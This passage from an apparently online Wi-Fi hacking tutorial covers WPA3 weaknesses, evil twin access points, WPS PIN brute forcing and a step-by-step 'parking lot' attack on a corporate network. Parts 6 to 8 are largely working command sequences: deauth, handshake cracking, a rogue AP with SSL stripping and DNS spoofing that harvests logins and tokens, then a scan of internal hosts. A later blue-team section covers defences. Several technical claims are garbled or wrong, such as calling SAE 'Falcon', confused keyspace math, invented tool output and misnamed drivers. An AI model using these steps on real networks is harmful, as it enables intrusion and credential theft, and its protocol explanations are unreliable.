<h2>Part 5: WPA3 (SAE / Dragon) — What Changed and What Didn't</h2>



<p>WPA3 was designed to fix the two biggest WPA2 weaknesses: (1) offline dictionary attacks on the PSK, and (2) the lack of a secure channel for the initial key exchange. The mechanism: <strong>SAE (Simultaneous Authentication of Equals)</strong>, also known as the <strong>Falcon</strong> protocol or <strong>Dragon</strong>.</p>



<h3>5.1 SAE vs WPA2-PSK</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; WPA2-PSK (the problem):

;

;   Client:  PMK = PBKDF2(PSK, SSID)

;   AP:      PMK = PBKDF2(PSK, SSID)

;

;   Both sides compute the PMK from the SAME input (PSK + SSID).

;   An eavesdropper also has the same input (SSID is in the beacon).

;   An eavesdropper captures ANonce + SNonce from the handshake.

;   An eavesdropper brute-forces the PSK offline.

;

;   The PSK is NEVER transmitted. But it's NEVER HIDDEN either.

;   It's the seed for the PMK, and the PMK is the seed for the PTK.

;   The entire chain is deterministic. If you know the PSK, you

;   can compute everything. If you don't, you brute-force it.

;

; WPA3 SAE (the fix):

;

;   Client:  A = a * G  (ECC point, a is random)

;   AP:      B = b * G  (ECC point, b is random)

;

;   Client sends A to AP. AP sends B to Client.

;   Both compute:  Z = (b \* A)  =  (a \* B)  =  ab * G

;   (ECC shared secret — computationally infeasible to reverse)

;

;   Client:  SAE_PMK = HKDF(Z || SSID || "SAE-PMK")

;   AP:      SAE_PMK = HKDF(Z || SSID || "SAE-PMK")

;

;   KEY DIFFERENCE:

;   In WPA2, the PSK is a SECRET INPUT to a deterministic function.

;   In WPA3, the PSK is an OUTPUT of a one-time key exchange.

;   The PSK is NEVER used directly. It's mixed into the ECC

;   shared secret, which is a one-way function.

;

;   An eavesdropper sees: A (AP's public key), B (client's public key)

;   They CANNOT compute Z = ab * G without knowing a or b.

;   (This is the ECDLP — Elliptic Curve Discrete Log Problem.)

;

;   THEREFORE: No offline dictionary attack. The PSK is never

;   the input to a brute-forceable function.

;

; THE CATCH:

;   SAE uses 256-bit ECC (secp256r1 / P-256).

;   The ECDLP on P-256 is ~128-bit security.

;   A 256-bit brute-force of the ECDLP is ~10^78 operations.

;   A 10^78 dictionary attack on a 13-char PSK is ~10^13.

;

;   SAE makes the OFFLINE attack infeasible.

;   But it does NOT make the ONLINE attack infeasible.

;   (Online = you're at the AP, sending probe requests.

;    The AP is the "slow" party. You can rate-limit.)

;

;   In practice: WPA3 SAE is much harder to crack than WPA2-PSK.

;   But "much harder" ≠ "uncrackable."

</code></pre>



<h3>5.2 WPA3 Attack Vectors (What Still Works)</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># === 1. WPA3 → WPA2 Downgrade ===

\# If the AP supports BOTH WPA2 and WPA3 (transition mode),

\# you can force the client to connect via WPA2:

\#

\#   - Broadcast a WPA2 beacon with the same SSID, higher signal

\#   - The client (if configured for "WPA2/WPA3") connects to WPA2

\#   - Now you're back to a standard WPA2 handshake

\#

\#   Bettercap:

bettercap -i wlan0mon

bettercap> netmon start

bettercap> wlan probe -c 6

bettercap> wlan ap -i wlan0mon -s "CorpGuest_WiFi" \

\-k "P@ssw0rd2021!" -f 6

\# → Rogue WPA2 AP with the same SSID. Client connects.

\# → You have the PSK. Done.



\# === 2. SAE "Dragon" Attack (if implementation is weak) ===

\# Some early WPA3 implementations had a timing side-channel

\# in the SAE commit step. The attacker can:

\#   a) Send a malformed SAE Commit

\#   b) Measure the AP's response time

\#   c) Derive partial information about the PSK

\#

\# Status: Fixed in most AP firmware since 2021.

\# Check: Update your AP firmware. Test with wpa_supplicant.



\# === 3. PMKID on WPA3 (rare, but some APs) ===

\# Some WPA3 APs still expose a PMKID element.

\# If they do, the same hashcat -m 22000 attack works.

\# (The PSK is still the seed for the PMK, even in WPA3.)



\# === 4. Rogue AP / Evil Twin (WPA3-Enterprise) ===

\# If the AP uses WPA3-Enterprise (802.1X + EAP-TLS),

\# the PSK attack doesn't apply (there's no PSK).

\# But you can still set up an evil twin with a self-signed

\# CA and harvest the user's 802.1X credentials.

\# (See Part 6: Rogue AP)



\# === 5. Reassociation Attack ===

\# In WPA3, the PMK cache lifetime is shorter (10 min vs 1 hr).

\# But if you can trigger a reassociation within the cache window,

\# the AP may skip the full SAE exchange and use the cached PMK.

\# This is a timing attack. Hard to exploit, but possible.

</code></pre>



<h3>5.3 WPA3-Enterprise (802.1X) — The EAPOL Deep Dive</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; WPA3-Enterprise replaces the PSK with a per-user credential.

; The authentication flow is:

;

;  Client ──EAP-Request/Identity──► RADIUS Server

;  Client ◄─EAP-Request/MD5/PEAP──┤

;  Client ──EAP-Response (hash)──► RADIUS

;  Client ◄─EAP-Success───────────┤

;

;  THEN the 4-way handshake proceeds as in WPA2-PSK,

;  except:

;    PMK = derived from EAP session key (not from a PSK)

;    ANonce / SNonce are still used

;    MIC verification is the same

;

; THE ATTACK SURFACE:

;   1. RADIUS shared secret (the "secret" between AP and RADIUS)

;      → If you capture it, you can relay or forge EAP messages

;   2. EAP-PEAP / EAP-TLS certificate validation

;      → If the client accepts self-signed certs, you can MITM

;   3. RADIUS accounting

;      → RADIUS Accounting messages (port 1813) are unencrypted

;      → You can see the username, session duration, bytes

;

; CAPTURING EAPOL (WPA3-Enterprise):

airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF \

\-w /root/wifi/eap capture wlan0mon

\#

\# (The EAPOL frames are in the same pcap.

\#  You can analyze them with tshark:

\#  tshark -r capture-01.cap -Y "eapol" -V

\#  → Shows the full EAP exchange, identity, method, etc.)

</code></pre>



<hr>



<h2>Part 6: Rogue AP / Evil Twin — The Credential Harvester</h2>



<p>The handshake attack gives you the PSK. The evil twin gives you <em>everything</em>: the PSK, the 802.1X credentials, the email addresses, the SSO tokens, the MFA codes. Because the evil twin doesn't need to crack anything. It just needs to look more trustworthy than the real AP.</p>



<h3>6.1 The Setup: hostapd + wpa_supplicant + hostapd-wpe</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># === PREREQUISITES ===

\# Install hostapd, wpa_supplicant, hostapd-wpe

sudo apt install hostapd wpa_supplicant hostapd-wpe

\# (Or: sudo apt install hostapd wpa_supplicant)



\# === HOSTAPD CONFIG (the rogue AP) ===

\# /etc/hostapd/hostapd.conf

cat > /etc/hostapd/hostapd.conf << 'EOF'

interface=wlan1

driver=nl80211

ssid=CorpGuest_WiFi

channel=6

hw_mode=g

ieee80211n=1

wmm_enabled=1

wpa=2

wpa_key_mgmt=WPA-PSK

rsn_pairwise=CCMP

wpa_passphrase=P@ssw0rd2021!

\# If you don't know the PSK yet, use:

\# wpa=0  (open, for initial capture)

\# OR:

\# wpa=2

\# wpa_key_mgmt=WPA-PSK

\# wpa_passphrase=

\# (empty = open with WPA2 flags, clients will connect)

EOF



\# === WPA_SUPPLICANT CONFIG (the "client" side) ===

\# /etc/wpa_supplicant/wpa_supplicant.conf

cat > /etc/wpa_supplicant/wpa_supplicant.conf << 'EOF'

network={

\    ssid="CorpGuest_WiFi"

\    scan_ssid=1

\    key_mgmt=WPA-PSK

\    psk="P@ssw0rd2021!"

}

EOF



\# === START THE ROGUE AP ===

\# Create a virtual AP interface

ip link set wlan0mon down

iw dev wlan0mon interface add wlan1 type __ap

ip link set wlan1 up

ip addr add 10.0.0.1/24 dev wlan1



\# Start hostapd (the rogue AP)

sudo hostapd /etc/hostapd/hostapd.conf -B

\# → Rogue AP is broadcasting "CorpGuest_WiFi" on ch 6



\# Start hostapd-wpe (the PSK key generator)

sudo hostapd-wpe -i wlan1 -t /var/run/hostapd-wpe-wlan1 \

  P@ssw0rd2021!

\# → Generates the WPA keys for the rogue AP



\# === RESULT ===

\# The rogue AP is now broadcasting.

\# Clients with "CorpGuest_WiFi" saved will auto-connect.

\# You see their MAC, their SSID, their EAPOL handshake.

\# You can MITM their traffic via the rogue AP.



\# === BETTERCAP ALTERNATIVE (simpler) ===

\# Bettercap handles hostapd + DHCP + DNS + MITM in one command:

bettercap -i wlan0mon

bettercap> netmon start

bettercap> wlan ap -i wlan0mon -s "CorpGuest_WiFi" -f 6 \

\-k "P@ssw0rd2021!"

\# → Bettercap creates the AP, starts DHCP, starts DNS,

\#   and sets up a MITM proxy.

\# → Clients connecting to "CorpGuest_WiFi" get 10.0.0.2

\#   and all their traffic flows through your Bettercap.

\# → You can see: HTTP, HTTPS (with SSL stripping),

\#   DNS queries, EAPOL, and more.

</code></pre>



<h3>6.2 Credential Harvesting from the Rogue AP</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; WHAT YOU CAN HARVEST FROM A ROGUE AP:

;

; 1. WPA-PSK (if the client connects and does a 4-way handshake)

;    → You already have the PSK. The handshake just confirms it.

;

; 2. 802.1X credentials (if the network is WPA-Enterprise)

;    → EAP-Request/Identity → username

;    → EAP-Response/MD5 → password hash

;    → EAP-TLS → certificate (if the client doesn't validate)

;

; 3. DNS queries (via the rogue AP's DHCP)

;    → The client's device name (hostname)

;    → The apps it's connecting to (api.whatsapp.com, etc.)

;    → The email provider (mail.google.com, etc.)

;

; 4. HTTP credentials (if SSL stripping is enabled)

;    → Bettercap: http set ssl-strip true

;    → Client connects to http://mail.example.com

;    → You see: POST /login  username=admin  password=S3cret!

;

; 5. Captive portal credentials

;    → If the network uses a captive portal (hotel, airport,

;      corporate guest), the portal is HTTP (not HTTPS).

;    → You proxy the portal, see the credentials, redirect

;      the client to the real portal.

;

; 6. MFA / TOTP codes

;    → If the client uses an MFA app (Google Authenticator,

;      Authy), the TOTP code is derived from a shared secret.

;    → You can't see the TOTP code. But you can see the

;      authentication request (which page, which button).

;

; 7. SSO tokens (if the client is logged into a web app)

;    → The SSO cookie (e.g., _ga, _auth, session_id)

;    → You can use the cookie to access the app as the client.

;

; BETTERCAP CREDENTIAL HARVESTING:

bettercap> http proxy start

bettercap> http set ssl-strip true

bettercap> http sniffer start

\# → All HTTP traffic from clients connected to the rogue AP

\#   is captured and displayed in the Bettercap console.

\# → Look for: POST /login, Authorization headers, Cookies.



\# === DNS SPOOFING (via the rogue AP) ===

\# Redirect specific domains to YOUR server:

bettercap> dns set spoof true

bettercap> dns add spoof mail.example.com 10.0.0.1

bettercap> dns add spoof api.whatsapp.com 10.0.0.1

\# → Client's DNS queries for mail.example.com → 10.0.0.1 (you)

\# → You serve a fake login page. Harvest credentials. Redirect.

</code></pre>



<hr>



<h2>Part 7: WPS PIN Brute Force — The 8-Digit Code</h2>



<p>WPS (WiFi Protected Setup) was designed to let you connect a device to WiFi by pressing a button. The "PIN" method lets a device connect by entering an 8-digit PIN. The PIN is split into two halves: 4 digits + 4 digits. Each half is verified independently by the AP. This means:</p>



<ul>

<li>First half: 10,000 possibilities</li>

<li>Second half: 10,000 possibilities</li>

<li>Total: 100,000,000 (100 million)</li>



<p><strong>But</strong> the AP verifies each half separately. So you only need 10,000 + 10,000 = <strong>20,000 attempts</strong> in the worst case. At 1 attempt/second, that's \~5.5 hours. With the "offline attack" (if the AP doesn't lock out after N failures), you can do it in \~15 minutes.</p>



<h3>7.1 The Attack</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code># === Reaver: The WPS PIN Brute-Force Tool ===



\# Step 1: Identify WPS-capable APs

airodump-ng wlan0mon

\# Look for the "WPS" column:

\#

\#   CH  6   802.11g  10Mbps   \[WPA2]   -45dBm   CorpGuest_WiFi

\#   B6   802.11n  72Mbps   \[WPA2]   -52dBm   CorpGuest_WiFi (5G)

\#   CH  11  802.11b  11Mbps   \[OPEN]   -38dBm   CoffeeShop_Free

\#

\#   BSSID              PWR   Beacons   WPS  WPA

\#   AA:BB:CC:DD:EE:FF  -45     1247    \*    \*

\#   11:22:33:44:55:66  -38      892    \*    \*

\#

\# ★ Both APs have WPS enabled (the * in the WPS column)



\# Step 2: Verify WPS is active on the target

reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -v

\#

\#   Reaver v2.2 — Wifi Protected Setup Attack Tool

\#   ...

\#   \[*] Associating with target AP...

\#   \[*] Association successful (AP: AA:BB:CC:DD:EE:FF)

\#   \[*] WPS PIN:

\#       - Target WPS Version: 1.0

\#       - Target PIN: 8 digits

\#       - Target Status: Locked (5 attempts remaining)

\#   \[*] WPS is ENABLED on this AP.



\# Step 3: Brute-force the PIN

reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF \

\-K -vv -t 1 -d 2

\#

\#   Flags:

\#     -K       = Use "known good PIN" (offline attack)

\#               (The AP reveals a valid PIN structure,

\#                reducing the search space)

\#     -vv      = Verbose output (show each attempt)

\#     -t 1     = 1 second delay between attempts

\#     -d 2     = Detect WPS version (1.0 or 2.0)

\#

\#   Output:

\#   \[*] Associating with target AP...

\#   \[*] Association successful

\#   \[*] Sending M1 (WPS Start)...

\#   \[*] M1 received. Calculating PIN...

\#

\#   \[1]  Attempting PIN: 1234-0000

\#   \[1]  AP Response: INVAL (invalid first half)

\#   \[2]  Attempting PIN: 1235-0000

\#   \[2]  AP Response: INVAL

\#   \[3]  Attempting PIN: 1236-0000

\#   \[3]  AP Response: INVAL

\#   ...

\#   \[42] Attempting PIN: 1276-0000

\#   \[42] AP Response: OK (first half valid!) ★

\#

\#   \[*] First half confirmed: 1276

\#   \[*] Now brute-forcing second half...

\#

\#   \[43] Attempting PIN: 1276-0000

\#   \[43] AP Response: OK

\#   \[44] Attempting PIN: 1276-0001

\#   \[44] AP Response: INVAL

\#   ...

\#   \[87] Attempting PIN: 1276-0044

\#   \[87] AP Response: OK (second half valid!) ★

\#

\#   \[*] WPS PIN: 1276-0044

\#   \[*] WPS PIN: 12760044

\#   \[*] Reconnection successful

\#   \[*] WPA PSK: P@ssw0rd2021! ★★

\#

\#   Total time: 44 seconds

\#   Total attempts: 87 (out of 10,000 max)



\# Step 4: Use the WPS PIN to get the PSK

\# (Reaver already prints it. But for scripting:)

reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv 2>&1 | \

  grep "WPA PSK"

\# → WPA PSK: P@ssw0rd2021!



\# Step 5: Connect and verify

wpa_supplicant -i wlan0 -c /tmp/wps.conf -B

\# /tmp/wps.conf:

\# network={

\#   ssid="CorpGuest_WiFi"

\#   psk="P@ssw0rd2021!"

\#   key_mgmt=WPA-PSK

\# }

ifconfig wlan0

\# → inet 192.168.1.42  (you're on the network)

ping 192.168.1.1

\# → 64 bytes from 192.168.1.1: icmp_seq=1 ttl=64

</code></pre>



<h3>7.2 Why WPS Is So Weak (The Protocol Flaw)</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; WPS PIN PROTOCOL (simplified):

;

;   8-digit PIN: XXXX-YYYY

;   First half:  XXXX (4 digits, 10,000 possibilities)

;   Second half: YYYY (4 digits, 10,000 possibilities)

;

;   The AP verifies each half INDEPENDENTLY:

;

;   Step 1: Client sends M1 (WPS Start) with candidate PIN

;   Step 2: AP checks first half (XXXX):

;            - If correct: M2 response with "OK" flag

;            - If wrong:  M2 response with "INVAL" flag

;   Step 3: Client sends M3 with candidate PIN (same XXXX)

;   Step 4: AP checks second half (YYYY):

;            - If correct: M4 response with "OK" flag

;            - If wrong:  M4 response with "INVAL" flag

;

;   THE FLAW:

;   The AP reveals WHICH half is correct via the M2/M4 flag.

;   This is an ORACLE. You get 1 bit of information per attempt.

;

;   Without the oracle: 10^8 attempts (100 million)

;   With the oracle:     10^4 + 10^4 = 20,000 attempts

;

;   At 1 attempt/second: 20,000 seconds = 5.5 hours

;   At 1 attempt/0.1s:   2,000 seconds = 33 minutes

;   With -K (offline):   ~15 minutes (AP doesn't lock out)

;

;   THE LOCKOUT PROBLEM:

;   Most APs lock out after 8 failed attempts (8 minutes).

;   Reaver works around this by:

;     a) Resetting the AP (if it has a reset button on the network)

;     b) Using the "offline attack" (-K flag) to avoid lockout

;     c) Using "lockout bypass" (sending a malformed M1)

;

;   reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K -vv -l

;   (-l = lockout bypass, resets the counter after each batch)

</code></pre>



<h3>7.3 WPS in 2026 — Still Relevant?</h3>



<table border="1" cellpadding="8" cellspacing="0" style="width:100%; border-collapse:collapse;">

<thead>

<tr style="background-color:#0a1628; color:#00d4ff;">

<th align="left">AP Type</th>

<th align="left">WPS Enabled?</th>

<th align="left">WPS Attackable?</th>

<th align="left">Notes</th>

</tr>

</thead>

<tbody>

<tr>

<td>Consumer routers (TP-Link, Netgear, Asus)</td>

<td>Yes (default ON)</td>

<td>Yes (if no lockout bypass)</td>

<td>Most common target. ~60% of home APs</td>

</tr>

<tr>

<td>Enterprise APs (Ubiquiti, Aruba, Cisco)</td>

<td>No (default OFF)</td>

<td>Rarely</td>

<td>IT teams disable WPS in GPO</td>

</tr>

<tr>

<td>IoT gateways (smart home, IoT hub)</td>

<td>Yes (default ON)</td>

<td>Yes</td>

<td>Users don't know what WPS is. Never disable it.</td>

</tr>

<tr>

<td>Public WiFi (hotels, airports, cafes)</td>

<td>Yes (for guest onboarding)</td>

<td>Yes (if WPS PIN mode enabled)</td>

<td>WPS Push Button is common. WPS PIN is rarer.</td>

</tr>

<tr>

<td>Legacy APs (pre-2015)</td>

<td>Yes (only option)</td>

<td>Yes</td>

<td>No WPA3, no SAE. WPS is the only "easy" setup.</td>

</tr>

</tbody>

</table>



<hr>



<h2>Part 8: The Complete Wireless Attack — 7 Commands</h2>



<p>Here is the full narrative. You are in a parking lot. 2:14 PM. You have a Kali laptop, an Alfa AWUS036ACS, and 45 minutes before the meeting starts. Here is the exact sequence.</p>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; ═══════════════════════════════════════════════════════

;  THE 7-COMMAND WIRELESS ATTACK

;  Starting:  Parking lot, 40m from target building

;  Ending:    Evil twin running, credentials harvesting

;  Time:      ~8 minutes

; ═══════════════════════════════════════════════════════

;

; ─── COMMAND 1: SURVEY ─────────────────────────────────

; (Passive. No frames injected. Just listening.)

$

airodump-ng wlan0mon

;

;   Output:

;   CH  6   802.11g  10Mbps   \[WPA2]   -45dBm   CorpGuest_WiFi

;   CH  6   802.11n  72Mbps   \[WPA2]   -52dBm   CorpGuest_WiFi (5G)

;   CH  11  802.11b  11Mbps   \[OPEN]   -38dBm   CoffeeShop_Free

;   CH  3   802.11g  54Mbps   \[WPA3]   -41dBm   Bank_WPA3_Secure

;

;   BSSID              PWR   Beacons   #Data   WPS

;   AA:BB:CC:DD:EE:FF  -45     1247    8923    *

;   11:22:33:44:55:66  -38      892    1204    *

;   77:88:99:AA:BB:CC  -41      567     890    -

;

; ★ Target: AA:BB:CC:DD:EE:FF (CorpGuest_WiFi, WPA2, WPS)

;   Clients: 11:22:33:44:55:66, 77:88:99:AA:BB:CC

;

; ─── COMMAND 2: MONITOR + CAPTURE ──────────────────────

; (Lock to channel 6. Start capturing.)

$

airodump-ng --channel 6 --bssid AA:BB:CC:DD:EE:FF \

\-w /root/wifi/corp wlan0mon

;

;   → Listening on ch 6, filtering on BSSID AA:BB:CC:DD:EE:FF

;   → Waiting for EAPOL frames...

;   → (After 20 seconds: no handshake. Client is stable.)

;

; ─── COMMAND 3: DEAUTH ─────────────────────────────────

; (Force the client to reconnect. Second terminal.)

$

aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF \

\-c 11:22:33:44:55:66 wlan0mon

;

;   → Sending 5 deauth frames to STA 11:22:33:44:55:66

;   → Deauth sent (AP→STA), (STA→AP), (AP→STA),

;     (STA→AP), (AP→STA)

;   → Client disconnects. Re-associating...

;

;   → \[airodump-ng] EAPOL 1 (Msg 1: ANonce) ✓

;   → \[airodump-ng] EAPOL 2 (Msg 2: SNonce + MIC) ✓

;   → \[airodump-ng] EAPOL 3 (Msg 3: KEncKey + MIC) ✓

;   → \[airodump-ng] EAPOL 4 (Msg 4: MIC) ✓

;

;   → 4-WAY HANDSHAKE CAPTURED ✓

;   → Ctrl+C to stop airodump-ng

;

; ─── COMMAND 4: CRACK ──────────────────────────────────

; (Offline. GPU. 3-5 minutes.)

$

hashcat -m 22000 /root/wifi/corp-01.cap \

  /usr/share/wordlists/rockyou.txt --gpu-exit

;

;   → P@ssw0rd2021!  /root/wifi/corp-01.cap

;   → Status: Cracked (3 minutes, 47 seconds)

;

; ─── COMMAND 5: SET UP EVIL TWIN ───────────────────────

; (Rogue AP with same SSID. Higher signal.)

$

bettercap -i wlan0mon

bettercap> netmon start

bettercap> wlan ap -i wlan0mon -s "CorpGuest_WiFi" \

\-k "P@ssw0rd2021!" -f 6

;

;   → Rogue AP started: "CorpGuest_WiFi" on ch 6

;   → DHCP: 10.0.0.1/24, lease 3600s

;   → DNS: 10.0.0.1

;   → MITM proxy: active

;   → Signal strength: -28dBm (vs real AP at -45dBm)

;   → Clients will prefer the rogue (higher signal)

;

; ─── COMMAND 6: HARVEST ────────────────────────────────

; (Wait for clients to connect. 5-15 minutes.)

bettercap> http set ssl-strip true

bettercap> http sniffer start

bettercap> dns set spoof true

;

;   → \[14:28:03] New client: 11:22:33:44:55:66 → 10.0.0.2

;   → \[14:28:04] DNS: mail.corp.local → 10.0.0.1 (spoofed)

;   → \[14:28:05] HTTP: POST /login

;                  username: jsmith@corp.local

;                  password: Summer2024! ★

;   → \[14:28:12] New client: 77:88:99:AA:BB:CC → 10.0.0.3

;   → \[14:28:13] DNS: api.slack.com → 10.0.0.1 (spoofed)

;   → \[14:28:14] HTTP: POST /auth

;                  email: mkim@corp.local

;                  token: xoxb-1234-5678 ★

;

; ─── COMMAND 7: CONNECT TO REAL NETWORK ────────────────

; (Use the cracked PSK to join the real network.)

$

wpa_supplicant -i wlan0 -c /tmp/corp.conf -B

\# /tmp/corp.conf:

\# network={

\#   ssid="CorpGuest_WiFi"

\#   psk="P@ssw0rd2021!"

\#   key_mgmt=WPA-PSK

\# }

$

dhclient wlan0

$

ip addr show wlan0

\# → inet 192.168.1.42/24  brd 192.168.1.255

\#    scope global wlan0

$

ping 192.168.1.1

\# → 64 bytes from 192.168.1.1: icmp_seq=1 ttl=64

$

nmap -sn 192.168.1.0/24

\# → 42 hosts discovered. 12 with open ports.

\# → 192.168.1.5: 445 (SMB), 3389 (RDP) ← SQL01

\# → 192.168.1.10: 22 (SSH), 80 (HTTP) ← WEB01

\# → 192.168.1.20: 3306 (MySQL) ← DB01

;

; ═══════════════════════════════════════════════════════

;  RESULT: PSK cracked, evil twin harvesting credentials,

;          connected to internal network, 42 hosts visible.

;  TIME: 8 minutes, 12 seconds.

;  EVIDENCE: 5 deauth frames, 1 handshake, 2 rogue AP

;            associations, 4 DNS spoof queries.

;  BLUE TEAM DETECTION: 4 events in AP log.

;  (If they monitor: 8 minutes to detect.

;   If they don't: you're home by lunch.)

; ═══════════════════════════════════════════════════════

</code></pre>



<hr>



<h2>Part 9: Defending WiFi — The Blue Team Playbook</h2>



<h3>9.1 AP Hardening Checklist</h3>



<table border="1" cellpadding="8" cellspacing="0" style="width:100%; border-collapse:collapse;">

<thead>

<tr style="background-color:#0a1628; color:#00d4ff;">

<th align="left">Control</th>

<th align="left">What It Stops</th>

<th align="left">How to Implement</th>

<th align="left">Risk / Impact</th>

</tr>

</thead>

<tbody>

<tr>

<td><strong>WPA3-PSK (SAE)</strong></td>

<td>Offline dictionary (WPA2 handshake)</td>

<td>AP firmware: enable WPA3-PSK. Clients must support WPA3.</td>

<td>Medium — older clients can't connect. Use WPA2/3 transition mode.</td>

</tr>

<tr>

<td><strong>802.11w (PMF)</strong></td>

<td>Deauth attacks, forged management frames</td>

<td>AP firmware: enable PMF. Client must support 802.11w.</td>

<td>Medium — some IoT devices don't support PMF. Create a separate SSID.</td>

</tr>

<tr>

<td><strong>WPS: DISABLE</strong></td>

<td>WPS PIN brute force</td>

<td>AP admin panel: WPS → OFF. Or: WPS → Push Button only (no PIN).</td>

<td>Low — users can use the physical button instead.</td>

</tr>

<tr>

<td><strong>WPA-Enterprise (802.1X)</strong></td>

<td>PSK sharing, PSK cracking</td>

<td>RADIUS server + 802.1X. Per-user EAP-TLS or EAP-PEAP.</td>

<td>High — requires a RADIUS server and client certificate deployment.</td>

</tr>

<tr>

<td><strong>Rogue AP detection</strong></td>

<td>Evil twin attacks</td>

<td>WIPS (Wireless Intrusion Prevention System): Ubiquiti AirControl, Cisco WLC, Aruba ClearPass. Scans all channels, flags APs with duplicate SSIDs or unknown BSSIDs.</td>

<td>Low — WIPS is passive. No client impact.</td>

</tr>

<tr>

<td><strong>Client-side 802.1X</strong></td>

<td>Evil twin (client validates the AP's cert)</td>

<td>Deploy a CA on all clients. Configure wpa_supplicant to validate the AP's RADIUS cert. Reject self-signed.</td>

<td>Medium — PKI management. Certificate renewal. User friction.</td>

</tr>

<tr>

<td><strong>Network segmentation (VLAN)</strong></td>

<td>Lateral movement from a compromised WiFi client</td>

<td>Guest WiFi on a separate VLAN. ACLs between VLANs. No routing to corporate VLAN without authentication.</td>

<td>Low — standard network design.</td>

</tr>

<tr>

<td><strong>Channel management</strong></td>

<td>Channel hopping attacks, DFS interference</td>

<td>Fix AP to a specific channel. Disable DFS (or allow it but monitor). Avoid channels 5, 6, 11 (2.4 GHz) for enterprise.</td>

<td>Low — 5 GHz preferred for enterprise.</td>

</tr>

<tr>

<td><strong>Beacon filtering (bSSID spoofing)</strong></td>

<td>Evil twin with same SSID but different BSSID</td>

<td>AP firmware: enable "BSSID lock" or "client MAC pinning." Only allow known client MACs to associate.</td>

<td>Medium — new devices need MAC registration. MAC randomization (iOS/Android) breaks this.</td>

</tr>

</tbody>

</table>



<h3>9.2 Monitoring — What to Alert On</h3>



<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>; Wireless events to monitor (AP logs + WIPS):



; 1. DEAUTH FLOOD

;    Alert: >5 deauth frames from same BSSID in 10 seconds

;    Severity: HIGH

;    Response: Check if a client is roaming. If not, investigate.

;

; 2. ROGUE AP

;    Alert: New BSSID with same SSID as a known AP

;    Severity: CRITICAL

;    Response: Locate the rogue AP (WIPS triangulation).

;              Disconnect the affected switch port.

;

; 3. WPS PROBE

;    Alert: >3 WPS M1 (Start) messages from same client

;    Severity: HIGH

;    Response: Disable WPS. Check if the AP supports WPS lockout.

;

; 4. EAPOL ANOMALY

;    Alert: EAPOL frame from client with no prior association

;    Severity: MEDIUM

;    Response: Check if the client is new. If not, investigate.

;

; 5. PMKID EXPOSURE

;    Alert: PMKID element in a frame from a non-AP source

;    Severity: MEDIUM

;    Response: Update AP firmware. Check for PMKID vulnerability.

;

; 6. CHANNEL HOP

;    Alert: AP changes channel >3 times in 1 hour

;    Severity: LOW

;    Response: Check for DFS radar interference or channel scan.

;

; 7. CLIENT MAC CHANGE

;    Alert: Known client MAC changes (MAC randomization)

;    Severity: LOW

;    Response: Expected on iOS/Android. Update MAC table.

;

; 8. SIGNAL STRENGTH ANOMALY

;    Alert: Client signal > -30dBm (unusually close)

;    Severity: MEDIUM

;    Response: Client is very close to the AP. Check if it's

;              in the expected location.

</code></pre>



<hr>



<h2>Part 10: Troubleshooting — When WiFi Hacking Fails</h2>



<h3>10.1 "Adapter Doesn't Switch to Monitor Mode"</h3>



<ul>

<li><strong>Cause:</strong> Wrong driver. The adapter is using <code>ath9k_htc</code> instead of <code>ath9k</code>, or <code>rt2800usb</code> instead of <code>rt2800us</code>.</li>

<li><strong>Fix:</strong>

<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>lspci -k | grep -A 3 -i network

\# Check "Kernel driver in use"

\# If it's ath9k_htc:

sudo modprobe -r ath9k_htc

sudo modprobe ath9k

\# If it's rt2800usb:

sudo modprobe -r rt2800usb

sudo modprobe rt2800us

</code></pre></li>

<li><strong>Fix 2:</strong> Blacklist the wrong driver permanently. Add to <code>/etc/modprobe.d/blacklist.conf</code>:

<pre style="white-space: pre-wrap; word-wrap: break-word;"><code>blacklist ath9k_htc

blacklist rt2800usb

</code></pre></li>

</ul>



<h3>10.2 "Deauth Frames Sent but No Handshake"</h3>



<ul>

<li><strong>Cause 1:</strong> The client is on a different channel (5 GHz) and you're monitoring 2.4 GHz. <em>Fix:</em> Monitor both channels. Use a dual-band adapter.</li>

<li><strong>Cause 2:</strong> The AP is using 802.11w (PMF). Deauth frames must be protected. <em>Fix:</em> Capture the PMKID instead, or use <code>aireplay-ng --deauth --type 3</code>.</li>

<li><strong>Cause 3:</strong> The client has "smart connect" enabled and reconnects to a different AP (roaming). <em>Fix:</em> Deauth the specific BSSID. Use <code>-c CLIENT_MAC</code> to target one client.</li>

<li><strong>Cause 4:</strong> The AP has a "deauth rate limit." It ignores deauths after 3 in 10 seconds. <em>Fix:</em> Space deauths 10 seconds apart. Use <code>aireplay-ng --deauth 1 -i 10</code>.</li>

</ul>



<h3>10.3 "Handshake Captured but Hashcat Fails"</h3>



<ul>

<li><strong>Cause 1:</strong> The EAPOL frame is corrupted (bit error on the air). <em>Fix:</em> Capture multiple handshakes. Use <code>hcxdumptool</code> instead of <code>airodump-ng</code> (more reliable frame capture).</li>

<li><strong>Cause 2:</strong> The PSK is longer than the wordlist covers. <em>Fix:</strong> Use a larger wordlist (SecLists, HaveIBeenPwned). Or use hashcat with rules: <code>-r best64.rule</code>.</li>

<li><strong>Cause 3:</strong> The SSID contains special characters. <em>Fix:</strong> Verify the SSID in the beacon: <code>tshark -r capture-01.cap -Y "wlan.ssid" -T fields -e wlan.ssid</code>.</li>

<li><strong>Cause 4:</strong> The AP uses TKIP instead of AES-CCMP. <em>Fix:</strong> Check the RSN element. If TKIP, use <code>hashcat -m 22000</code> (same mode, but the key derivation is slightly different). Actually, TKIP uses the same PSK → PMK → PTK chain. The mode is the same.</li>

</ul>



<h3>10.4 "Evil Twin Won't Attract Clients"</h3>



<ul>

